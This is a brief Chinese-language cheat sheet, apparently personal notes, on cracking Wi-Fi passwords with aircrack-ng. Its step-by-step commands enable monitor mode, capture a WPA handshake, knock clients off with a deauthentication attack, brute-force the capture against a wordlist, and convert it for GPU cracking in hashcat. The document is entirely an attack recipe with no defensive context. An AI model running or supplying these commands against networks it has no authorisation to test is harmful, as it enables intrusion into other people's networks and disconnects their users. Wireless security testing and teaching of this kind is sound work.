# aircrack-ng使用

### airmon-ng start wlan1 开启网卡混杂模式
### airodump-ng wlan1mon 扫描无线网络包
### airodump-ng -i -c 1 -w xxx -d bssid wlan1mon 设置1信道和只抓取握手包，文件名xxx前缀抓包
### aireplay-ng -0 1 -a bssid -c mac wlan1mon 解除认证攻击
### aircrack-ng -w wordlist xxx.ivs

### 转hashcat使用显卡破解
  aircrack-ng -J xxx xxx.ivs
  hashcat -m 2500  xxx.hcapp wordlist.txt
